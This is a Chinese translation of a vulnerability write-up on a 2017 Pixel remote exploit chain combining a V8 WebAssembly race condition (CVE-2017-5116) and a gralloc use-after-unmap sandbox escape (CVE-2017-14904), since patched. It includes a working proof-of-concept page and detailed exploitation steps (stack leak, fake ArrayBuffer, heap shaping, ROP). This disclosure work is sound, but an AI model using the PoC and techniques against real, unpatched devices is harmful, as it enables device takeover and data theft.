@@ -1,0 +1,491 @@
+# Android 安全生态投资系统为Pixel支付奖励金
+
+阅读量 **205354**
+
+|评论 **1**
+
+发布时间 : 2018-01-23 14:00:23
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t01120c98ba4c509541.png)
+
+2017年6月，Android安全团队提高了Android漏洞奖励计划（ASR）的最高奖金额度，并与研究人员一起简化了漏洞提交流程。2017年8月，奇虎360科技有限公司Alpha团队的龚广，提交了自ASR项目开展以来第一个有效的远程利用链。龚广提交了详细的报告，因此被授予105000美元的奖励，这是有史以来ASR最高的奖励，同时也获得Chrome奖励项目的7500美元奖金，总共112500美元。这一整套安全问题，作为2017年12月份的安全更新中的一部分，已经被修复。安全补丁级别为2017-12-05或更高版本的设备将不受影响。
+
+所有的使用A/B(无缝)系统更新的pixel设备或者合作合伙设备将自动安装这些更新，用户需要重新启动设备来完成更新。
+
+Android安全团队要感谢龚广以及研究者社区对Android安全的贡献。如果你想参与Android漏洞奖励计划，可以查看[项目规则](https://www.google.com/about/appsecurity/android-rewards/)。有关如何提交报告的提示，请参阅[Bug Hunter
+University](https://sites.google.com/site/bughunteruniversity/improve/how-to-submit-an-android-platform-bug-report)。
+
+以下是奇虎360公司Alpha团队的龚广提交的安全报告。
+
+## Pixel远程攻击链的技术细节
+
+Pixel 手机受到多个层面的安全保护，是2017 Mobile Pwn2Own
+比赛中唯一没有被攻破的设备。但是，2017年8月，我们团队发现了一个远程攻击链——这是ASR项目开展以来的首个远程有效利用。感谢Android安全团队在漏洞处理过程中的快速响应和帮助。
+
+这篇文章涵盖了漏洞利用链的技术细节。利用链使用了两个漏洞，CVE-2017-5116 和
+CVE-2017-14904，CVE-2017-5116是V8引擎漏洞，用于在Chrome沙箱渲染进程中获得代码执行。CVE-2017-14904是Android里libgmalloc模块中的一个bug，用于逃逸Chrome的沙箱。将两者结合，通过在Chrome浏览器里访问一个恶意的连接，该攻击链可以往系统服务进程注入任意代码。如果想要重现漏洞利用，下面是一个包含漏洞的环境：
+
+Chrome 60.3112.107 + Android 7.1.2 (Security patch level 2017-8-05)
+
+(google/sailfish/sailfish:7.1.2/NJH47F/4146041:user/release-keys)。
+
+## RCE漏洞(CVE-2017-5116)
+
+新功能通常会带来新的问题。V8 6.0版本引入了对SharedArrayBuffer的支持，它是JavaScript
+worker线程用来共享内存的一种底层机制。SharedArrayBuffer 使 JavaScript
+能够原子的、互斥的访问共享内存。WebAssembly是一种可以在现代Web浏览器中运行的新类型的代码，它是一种低级汇编式语言，具有紧凑的二进制格式，以接近原生代码的性能运行，并提供语言（如C/C++）编译功能，以便他们可以在web上运行。
+结合Chrome的三个特性，SharedArrayBuffer、 WebAssembly以及web
+worker，通过条件竞争，可以触发越界访问。简单来讲，WebAssembly代码可以被放进
+SharedArrayBuffer，将SharedArrayBuffer传送给web
+worker，当主线程解析WebAssembly代码的时候，worker线程可以修改这个代码，从而导致越界访问。
+
+漏洞代码在函数GetFirstArgumentAsBytes中，函数参数可以是ArrayBuffer或者TypedArray 对象。
+SharedArrayBuffer 引入 JavaScript 之后，TypedArray可以使用
+
+SharedArrayBuffer作为存储结构，因此其他worker线程在任何时候都可能修TypedArray中的内容。
+
+    
+    
+    i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(
+    const v8::FunctionCallbackInfo<v8::Value>& args, ErrorThrower* thrower) {
+    ......
+    } else if (source->IsTypedArray()) {
+         //--->source should be checked if it's backed by a SharedArrayBuffer
+        // A TypedArray was passed.
+        Local<TypedArray> array = Local<TypedArray>::Cast(source);
+        Local<ArrayBuffer> buffer = array->Buffer();
+        ArrayBuffer::Contents contents = buffer->GetContents();
+        start =reinterpret_cast<const byte*>(contents.Data()) + array->ByteOffset();
+        length = array->ByteLength();
+    }
+    ......
+    return i::wasm::ModuleWireBytes(start, start + length);
+    }
+    
+
+一个简单的PoC如下：
+
+    
+    
+    <html>
+    <h1>poc</h1>
+    <script id="worker1">
+    worker:{
+        self.onmessage = function(arg) {
+            console.log("worker started");
+            var ta = new Uint8Array(arg.data);
+            var i =0;
+            while(1){
+                if(i==0){
+                    i=1;
+                    ta[51]=0; //--->4)modify the webassembly code at the same time
+                }else{
+                    i=0;
+                    ta[51]=128;
+                }
+            }
+         }
+    }
+    </script>
+    <script>
+    function getSharedTypedArray(){
+    var wasmarr = [
+    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+    0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
+    0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,
+    0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,
+    0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,
+    0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,
+    0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b];
+    var sb = new SharedArrayBuffer(wasmarr.length);
+    //---> 1)put WebAssembly code in a SharedArrayBuffer
+    var sta = new Uint8Array(sb);
+    for(var i=0;i<sta.length;i++)
+    sta[i]=wasmarr[i];
+    return sta;
+    }
+    var blob = new Blob([
+    document.querySelector('#worker1').textContent
+    ], { type: "text/javascript" })
+    var worker = new Worker(window.URL.createObjectURL(blob)); //---> 2)create a web worker
+    var sta = getSharedTypedArray();
+    worker.postMessage(sta.buffer);
+    //--->3)pass the WebAssembly code to the web worker
+    setTimeout(function(){
+    while(1){
+        try{
+            sta[51]=0;
+            var myModule = new WebAssembly.Module(sta); //--->4)parse the WebAssembly code
+            var myInstance = new WebAssembly.Instance(myModule);
+            //myInstance.exports.getAnswerPlus1();
+        }catch(e){
+    }
+    }
+    },1000);
+    //worker.terminate();
+    </script>
+    </html>
+    
+
+WebAssembly代码的文本格式如下：
+
+    
+    
+    00002b func[0]:
+    00002d: 41 2a                      | i32.const 42
+    00002f: 0b                         | end
+    000030 func[1]:
+    000032: 10 00                      | call 0
+    000034: 41 01                      | i32.const 1
+    000036: 6a                         | i32.add
+    000037: 0b                         | end
+    
+
+首先，把上面二进制格式的WebAssembly代码放进一个 SharedArrayBuffer，然后创建一个
+TypedArray数组，并且使用包含WebAssembly代码的SharedArrayBuffer作为其缓冲区。之后，创建一个worker线程，并且将SharedArrayBuffer传入这个新创建的worker
+线程。当主线程解析 WebAssembly代码的同时，worker 线程修改SharedArrayBuffer的内容。
+
+在这种情况下，条件竞争引发了[TOCTOU](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use)问题。主线程边界检测完成之后，指令”call
+0″ 可以被worker 线程修改为”call 128″，当主线程解析并且编译WebAssembly代码时，越界访问就会发生。
+
+由于 “call 0” 指令可以被修改为任何其他的WebAssembly函数，因此漏洞利用非常简单。 如果 “call 0” 被修改为 “call
+$leak”，寄存器和栈上的内容将会被泄漏到到Web Assembly内存中。由于函数 “0” 和函数
+“$leak”的参数个数不同，这将导致栈上许多有用的数据被泄露。
+
+    
+    
+    (func $leak(param i32 i32 i32 i32 i32 i32)(result i32)
+        i32.const 0
+        get_local 0
+        i32.store
+        i32.const 4
+        get_local 1
+        i32.store
+        i32.const 8
+        get_local 2
+        i32.store
+        i32.const 12
+        get_local 3
+        i32.store
+        i32.const 16
+        get_local 4
+        i32.store
+        i32.const 20
+        get_local 5
+        i32.store
+        i32.const 0
+      ))
+    
+
+不仅仅是 “call 0” 指令可以被修改，任何 “call funcx” 指令都可以被修改。假设 funcx
+是一个带有6个参数的如下函数，当V8在ia32架构下编译的时候，前5个参数通过寄存器传递，第六个参数通过栈传递。所有的参数值可以通过 JavaScript
+被设置为任何值。
+
+    
+    
+    /*Text format of funcx*/
+     (func $simple6 (param i32 i32 i32 i32 i32 i32 ) (result i32)
+        get_local 5
+        get_local 4
+        i32.add)
+    
+    /*Disassembly code of funcx*/
+    --- Code ---    kind = WASM_FUNCTION
+    name = wasm#1
+    compiler = turbofan
+    Instructions (size = 20)
+    0x58f87600     0  8b442404       mov eax,[esp+0x4]
+    0x58f87604     4  03c6           add eax,esi
+    0x58f87606     6  c20400         ret 0x4
+    0x58f87609     9  0f1f00         nop
+    
+    Safepoints (size = 8)
+    
+    RelocInfo (size = 0)
+    
+    --- End code ---    
+
+当 JavaScript 调用 WebAssembly 函数的时候，v8编译器在内部创建一个 JS_TO_WASM 函数，编译完之后，JavaScript
+函数将会调用创建的 JS_TO_WASM 函数，然后 JS_TO_WASM 将会调用 WebAssembly 函数。JS_TO_WASM
+使用不同的调用方式，它的第一个参数是通过栈传递的。如果 “call funcx” 被修改为如下 JS_TO_WASM 函数，
+
+    
+    
+    /*Disassembly code of JS_TO_WASM function */
+    --- Code ---    kind = JS_TO_WASM_FUNCTION
+    name = js-to-wasm#0
+    compiler = turbofan
+    Instructions (size = 170)
+    0x4be08f20     0  55             push ebp
+    0x4be08f21     1  89e5           mov ebp,esp
+    0x4be08f23     3  56             push esi
+    0x4be08f24     4  57             push edi
+    0x4be08f25     5  83ec08         sub esp,0x8
+    0x4be08f28     8  8b4508         mov eax,[ebp+0x8]
+    0x4be08f2b     b  e8702e2bde     call 0x2a0bbda0  (ToNumber)    ;; code: BUILTIN
+    0x4be08f30    10  a801           test al,0x1
+    0x4be08f32    12  0f852a000000   jnz 0x4be08f62  <+0x42>
+    
+
+JS_TO_WASM 函数将会把 funcx
+的第六个参数当做它的第一个参数，但是它把第一个参数当做对象指针，因此当把这个参数传递ToNumber函数，将会产生类型混淆问题，这也意味着我们可以将任何被当做对象指针的数值传递给ToNumber函数。因此，我们可以在某些地址如在一个double
+array中伪造一个ArrayBuffe对象，并将其传给ToNumber函数。ArrayBuffer 的布局如下：
+
+    
+    
+    /* ArrayBuffer layouts 40 Bytes*/                                                                                                                         
+    Map                                                                                                                                                       
+    Properties                                                                                                                                                
+    Elements                                                                                                                                                  
+    ByteLength                                                                                                                                                
+    BackingStore                                                                                                                                              
+    AllocationBase                                                                                                                                            
+    AllocationLength                                                                                                                                          
+    Fields                                                                                                                                                    
+    internal                                                                                                                                                  
+    internal                                                                                                                                                                                                                                                                                                      
+    
+    
+    /* Map layouts 44 Bytes*/                                                                                                                                   
+    static kMapOffset = 0,                                                                                                                                    
+    static kInstanceSizesOffset = 4,                                                                                                                          
+    static kInstanceAttributesOffset = 8,                                                                                                                     
+    static kBitField3Offset = 12,                                                                                                                             
+    static kPrototypeOffset = 16,                                                                                                                             
+    static kConstructorOrBackPointerOffset = 20,                                                                                                              
+    static kTransitionsOrPrototypeInfoOffset = 24,                                                                                                            
+    static kDescriptorsOffset = 28,                                                                                                                           
+    static kLayoutDescriptorOffset = 1,                                                                                                                       
+    static kCodeCacheOffset = 32,                                                                                                                             
+    static kDependentCodeOffset = 36,                                                                                                                         
+    static kWeakCellCacheOffset = 40,                                                                                                                         
+    static kPointerFieldsBeginOffset = 16,                                                                                                                    
+    static kPointerFieldsEndOffset = 44,                                                                                                                      
+    static kInstanceSizeOffset = 4,                                                                                                                           
+    static kInObjectPropertiesOrConstructorFunctionIndexOffset = 5,                                                                                           
+    static kUnusedOffset = 6,                                                                                                                                 
+    static kVisitorIdOffset = 7,                                                                                                                              
+    static kInstanceTypeOffset = 8,     //one byte                                                                                                            
+    static kBitFieldOffset = 9,                                                                                                                               
+    static kInstanceTypeAndBitFieldOffset = 8,                                                                                                                
+    static kBitField2Offset = 10,                                                                                                                             
+    static kUnusedPropertyFieldsOffset = 11
+    
+
+由于栈上的内容可以被泄露出去，所以我们可以获取很多有用的数据来伪造这个
+ArrayBuffer，例如，我们可以泄露一个对象的起始地址，计算该对象的elements属性的起始地址，elements属性是FixedArray类型的对象。我们可以使用这个FixedArray对象作为伪造的ArrayBuffer的properties和elements属性部分，同时我们还得伪造ArrayBuffer的map属性部分。幸运的是，在触发漏洞的时候，大多数map属性字段并没有被使用。
+
+但是偏移8个字节的InstanceType必须设置为0xc3（这个值取决于V8的版本），用来表明这个对象是
+ArrayBuffer。为了在JavaScript中获得伪造的ArrayBuffer的引用，我们必须将map中偏移16字节的Prototype字段设置为一个对象，该对象的Symbol.toPrimitive属性是一个JavaScript回调函数。当这个伪造的数组传进ToNumber函数，ArrayBuffer对象会被转换成数字，此回调函数将会被调用。因此我们在回调函数中可以得到伪造的ArrayBuffer的引用。由于ArrayBuffer伪造在double
+array中，该array的内容可以被设置成任意值，因此我们可以修改伪造的ArrayBuffer的BackingStore和ByteLength字段，从而获得任意地址读写的能力。有了任意地址读写能力，执行shellcode将非常简单。Chrome中JIT代码是可读、可写、可执行的，因此我们可以通过覆盖JIT代码来执行ShellCode。
+
+Chrome团队非常迅速的在chrome 61.0.3163.79版本中修复了这个问题，仅仅在我们提交此利用一周之后就修复了。
+
+## 提权漏洞(EoP) (CVE-2017-14904)
+
+沙箱逃逸漏洞是由于map和unmap不匹配导致的Use-After-Unmap问题，漏洞代码位于gralloc_map和gralloc_unmap函数：
+
+    
+    
+    static int gralloc_map(gralloc_module_t const* module,
+    buffer_handle_t handle){
+     ……
+    private_handle_t* hnd = (private_handle_t*)handle;
+    ……
+    if (!(hnd->flags & private_handle_t::PRIV_FLAGS_FRAMEBUFFER) &&
+    !(hnd->flags & private_handle_t::PRIV_FLAGS_SECURE_BUFFER)) {
+        size = hnd->size;
+        err = memalloc->map_buffer(&mappedAddress, size,
+        hnd->offset, hnd->fd);
+    //---> mapped an ashmem and get the mapped address. the ashmem fd and offset can     be controlled by Chrome r
+        if(err || mappedAddress == MAP_FAILED) {
+            ALOGE("Could not mmap handle %p, fd=%d (%s)",
+            handle, hnd->fd, strerror(errno));
+            return -errno;
+        }
+    hnd->base = uint64_t(mappedAddress) + hnd->offset;
+    //---> save mappedAddress+offset to hnd->base
+    } 
+    else {
+    err = -EACCES;
+    }
+    ……
+    return err;
+    } 
+    
+
+gralloc_map将由参数handle控制的图形缓冲区映到内存，gralloc_unmap
+进行unmap，被映射的地址加上hnd->offset赋值给hnd->base，但是在unmap的时候，hnd->base直接传递给unmap系统调用，并没有减去hnd->offset。hnd->offset可以被Chrome的沙箱进程中控制，因此可以从Chrome沙箱的渲染进程中unmap
+system_server中的任何内存页。
+
+    
+    
+    static int gralloc_unmap(gralloc_module_t const* module,
+    buffer_handle_t handle)
+    {
+    ……
+    if(hnd->base) {
+        err = memalloc->unmap_buffer((void*)hnd->base, hnd->size, hnd->offset);
+    //---> while unmapping, hnd->offset is not used, hnd->base is used as the base address, map and unmap are
+        if (err) {
+            ALOGE("Could not unmap memory at address %p, %s", (void*) hnd->base,
+            strerror(errno));
+            return -errno;
+        }
+        hnd->base = 0;
+    }
+    ……
+    return 0;
+    }
+    int IonAlloc::unmap_buffer(void *base, unsigned int size,
+    unsigned int /*offset*/)
+    //---> look, offset is not used by unmap_buffer
+    {
+    int err = 0;
+    if(munmap(base, size)) {
+        err = -errno;
+        ALOGE("ion: Failed to unmap memory at %p : %s",
+        base, strerror(errno));
+    }
+    return err;
+    }  
+
+尽管SeLinux限制了isolated_app域访问大多数Android系统服务，但是isolated_app仍然可以访问三个系统服务。
+
+    
+    
+    neverallow isolated_app {
+        service_manager_type
+        -activity_service
+        -display_service
+        -webviewupdate_service
+    }:service_manager find;
+    
+
+为了从Chrome沙箱进程中触发上面提到的Use-After-Unmap漏洞，首先将一个可序列化的GraphicBuffer对象放进bundle，然后调用IActivityManager的binder方法convertToTranslucent，将恶意的bundle传递给system_server，当system_server处理这个恶意的bundle的时候，这个漏洞就会被触发。
+
+这个提权漏洞指向的攻击面与我在2016
+MoSec上介绍的相同，[安卓Chrome沙箱逃逸的一种姿势](https://github.com/secmob/mosec2016/blob/master/%E5%AE%89%E5%8D%93Chrome%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%A7%BF%E5%8A%BF.pdf)，也类似于[Bitunmap](https://googleprojectzero.blogspot.com/2016/12/bitunmap-attacking-android-ashmem.html)，但是从Chrome的沙箱进程中利用此种类型的漏洞要比从app中利用困难的多。
+
+这个提权漏洞的利用大概可以分为六步：
+
+  1. 地址空间整形，使地址空间布局看起来如下，一个堆块正好在一些连续的ashmem映射之上：
+
+    
+    
+    7f54600000-7f54800000 rw-p 00000000 00:00 0         [anon:libc_malloc]
+    7f58000000-7f54a00000 rw-s 001fe000 00:04 32783     /dev/ashmem/360alpha29 (deleted)
+    7f54a00000-7f54c00000 rw-s 00000000 00:04 32781     /dev/ashmem/360alpha28 (deleted)
+    7f54c00000-7f54e00000 rw-s 00000000 00:04 32779     /dev/ashmem/360alpha27 (deleted)
+    7f54e00000-7f55000000 rw-s 00000000 00:04 32777     /dev/ashmem/360alpha26 (deleted)
+    7f55000000-7f55200000 rw-s 00000000 00:04 32775     /dev/ashmem/360alpha25 (deleted)
+    ......
+    
+
+  2. 通过触发漏洞，unmap掉堆块的一部分(1KB)和一部分共享内存空间(ashmem: 2MB-1KB)
+
+    
+    
+    7f54400000-7f54600000 rw-s 00000000 00:04 31603  /dev/ashmem/360alpha1000 (deleted)
+    7f54600000-7f547ff000 rw-p 00000000 00:00 0       [anon:libc_malloc]
+    //--->There is a 2MB memory gap
+    7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783    /dev/ashmem/360alpha29 (deleted)
+    7f54a00000-7f54c00000 rw-s 00000000 00:04 32781   /dev/ashmem/360alpha28 (deleted)
+    7f54c00000-7f54e00000 rw-s 00000000 00:04 32779   /dev/ashmem/360alpha27 (deleted)
+    7f54e00000-7f55000000 rw-s 00000000 00:04 32777   /dev/ashmem/360alpha26 (deleted)
+    7f55000000-7f55200000 rw-s 00000000 00:04 32775   /dev/ashmem/360alpha25 (deleted)
+    
+
+  3. 用ashmem内存填充unmap掉的地址空间
+
+    
+    
+    7f54400000-7f54600000 rw-s 00000000 00:04 31603  /dev/ashmem/360alpha1000 (deleted)
+    7f54600000-7f547ff000 rw-p 00000000 00:00 0       [anon:libc_malloc]
+    7f547ff000-7f549ff000 rw-s 00000000 00:04 31605    /dev/ashmem/360alpha1001 (deleted)  
+    //--->The gap is filled with the ashmem memory 360alpha1001
+    7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783    /dev/ashmem/360alpha29 (deleted)
+    7f54a00000-7f54c00000 rw-s 00000000 00:04 32781   /dev/ashmem/360alpha28 (deleted)
+    7f54c00000-7f54e00000 rw-s 00000000 00:04 32779   /dev/ashmem/360alpha27 (deleted)
+    7f54e00000-7f55000000 rw-s 00000000 00:04 32777   /dev/ashmem/360alpha26 (deleted)
+    7f55000000-7f55200000 rw-s 00000000 00:04 32775   /dev/ashmem/360alpha25 (deleted)
+    
+
+  4. 通过堆喷射，将堆数据写入ashmem内存中
+
+    
+    
+    7f54400000-7f54600000 rw-s 00000000 00:04 31603   /dev/ashmem/360alpha1000 (deleted)
+    7f54600000-7f547ff000 rw-p 00000000 00:00 0       [anon:libc_malloc]
+    7f547ff000-7f549ff000 rw-s 00000000 00:04 31605    /dev/ashmem/360alpha1001 (deleted)
+    //--->the heap manager believes the memory range from 0x7f547ff000 to 0x7f54800000 is still mongered by it and will allocate memory from this range, result in heap data is written to ashmem memory
+    7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783    /dev/ashmem/360alpha29 (deleted)
+    7f54a00000-7f54c00000 rw-s 00000000 00:04 32781   /dev/ashmem/360alpha28 (deleted)
+    7f54c00000-7f54e00000 rw-s 00000000 00:04 32779   /dev/ashmem/360alpha27 (deleted)
+    7f54e00000-7f55000000 rw-s 00000000 00:04 32777   /dev/ashmem/360alpha26 (deleted)
+    7f55000000-7f55200000 rw-s 00000000 00:04 32775   /dev/ashmem/360alpha25 (deleted)
+
+  5. 由于步骤3中的填充的ashmem可以被同时映射在system_server进程和渲染进程中，渲染进程可以读写system_server进程中的部分堆的内容，我们可以触发system_server在ashmem中分配一些GraphicBuffer对象。 因为GraphicBuffer继承ANativeWindowBuffer类，ANativeWindowBuffer类有个叫common的成员，它的类型是android_native_base_t。我们可以从ashmem读取两个函数指针（incRef和decRef），并计算libui模块的基地址。在最新的Pixel设备中，Chrome渲染进程仍然是32位的，但是system_server是64位进程，因此我们还需泄露一些模块的基地址，用来ROP。现在，我们拥有libui模块的基地址，最后的步骤就是触发ROP。不太幸运的是，函数指针incRef和decRef看起来并没有被使用，不可能通过修改他们跳转到ROP，但是我们可以修改GraphicBuffer的虚表，从而触发ROP。
+
+    
+    
+    typedef struct android_native_base_t
+    {
+    /* a magic value defined by the actual EGL native type */
+    int magic;
+    /* the sizeof() of the actual EGL native type */
+    int version;
+    void* reserved[4];
+    /* reference-counting interface */
+    void (*incRef)(struct android_native_base_t* base);
+    void (*decRef)(struct android_native_base_t* base);
+    } android_native_base_t;  
+    
+
+  6. 触发GC，执行ROP，当GraphicBuffer对象析构的时候，虚函数onLastStrongRef 将被调用，因此我们可以覆盖此函数，从而跳转到ROP，这样控制流转入ROP。从一个单一的libui模块找到合适的ROP链非常具有挑战性，但是经过不断的努力，我们成功找到了一个ROP链，并且将/data/misc/wifi/wpa_supplicant.conf的文件内容转存出来了。
+
+因为system_server是权限很高的系统进程，能以system_server的身份执行任意代码意味着手机中绝大部分数据都可以被获取，手机的大部分权限可能被恶意使用。此漏洞链可能带来的危害包括但不限于获取手机的短信，通讯录，照片，通过后台程序使用手机发短信，打电话，录音录像等。
+
+## 小结
+
+对于我们的报告，Android安全团队响应非常迅速，在2017年12月的安全更新中修复了这两个漏洞。2017-12-05的安全补丁或更高版本的设备，将不受影响。但是在敏感的位置解析不可信的parcels仍然存在，Android安全团队正在努力加固平台，以缓解类似的漏洞。
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **360 Alpha Team** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/95733](/post/id/95733)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Android](/tag/Android)
+  * [Pixel](/tag/Pixel)
+  * [安全补丁](/tag/安全补丁)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p1.ssl.qhimg.com/t01dc8177a479e711f2.jpg) 360 Alpha Team
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
